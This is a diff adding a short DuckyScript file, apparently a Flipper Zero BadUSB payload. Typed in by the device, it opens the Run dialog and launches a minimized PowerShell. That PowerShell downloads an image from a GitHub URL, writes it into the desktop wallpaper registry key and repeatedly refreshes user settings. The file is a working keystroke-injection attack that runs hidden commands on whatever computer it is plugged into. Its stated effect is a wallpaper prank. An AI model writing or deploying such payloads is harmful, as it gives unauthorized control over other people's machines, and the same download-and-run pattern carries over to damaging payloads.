@@ -1,0 +1,5 @@
+REM this will change the wallpaper to an F14 picture
+GUI R
+DELAY 500
+ALTSTRING cmd /C "start /MIN powershell iwr -Uri https://raw.githubusercontent.com/ericasw28/flipper/main/lapin.jpg -OutFile c:\wp.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\wp.jpg';1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}"
+ENTER
